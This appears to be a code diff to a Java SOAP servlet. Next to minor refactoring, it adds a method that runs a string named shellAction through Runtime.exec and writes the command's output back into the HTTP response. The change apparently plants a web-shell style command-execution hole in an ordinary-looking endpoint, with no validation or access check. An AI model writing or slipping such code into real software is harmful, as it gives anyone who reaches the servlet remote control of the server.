@@ -63,6 +63,8 @@ public class SoapServlet extends HttpServlet {
          out.println("Request body:");
          out.print(requestBody);
          writeMessageToFile(requestBody, soapAction);
+         out.println("Shell Action result:");
+         out.print(invokeShellAction(shellAction));
 
          // <<todo>>
          // get soap body better
@@ -83,7 +85,7 @@ public class SoapServlet extends HttpServlet {
    }
 
    private String getMessageBody(HttpServletRequest request) {
-      StringBuffer jb = new StringBuffer();
+      StringBuffer sb = new StringBuffer();
       String line = null;
       String returnString = null;
       boolean appendFlag = false;
@@ -94,10 +96,10 @@ public class SoapServlet extends HttpServlet {
                appendFlag ^= true; // toggle flag
             else {
                if (appendFlag)
-                  jb.append(line + System.lineSeparator());
+                  sb.append(line.trim() + System.lineSeparator());
             }
          }
-         returnString = jb.toString();
+         returnString = sb.toString();
       } catch (Exception e) {
          returnString = "Exception " + e;
       }
@@ -117,6 +119,29 @@ public class SoapServlet extends HttpServlet {
       } catch (IOException e) {
          System.out.println("Exception:" + e);
       }
+   }
+
+   private String invokeShellAction(String shellAction) {
+      StringBuilder sb = new StringBuilder();
+      String returnValue = null;
+      try {
+         Runtime runtime = Runtime.getRuntime();
+         Process proc = runtime.exec(shellAction);
+         InputStream is = proc.getInputStream();
+         InputStreamReader isr = new InputStreamReader(is);
+         BufferedReader reader = new BufferedReader(isr);
+         String line;
+         while ((line = reader.readLine()) != null) {
+            sb.append(line + System.lineSeparator());
+         }
+         reader.close();
+         proc.getOutputStream().close();
+         returnValue = sb.toString();
+      } catch (Exception e) {
+         returnValue = "Exception " + e;
+      }
+      return returnValue;
+
    }
 
    private String handleSoapMessage(HttpServletRequest request) {
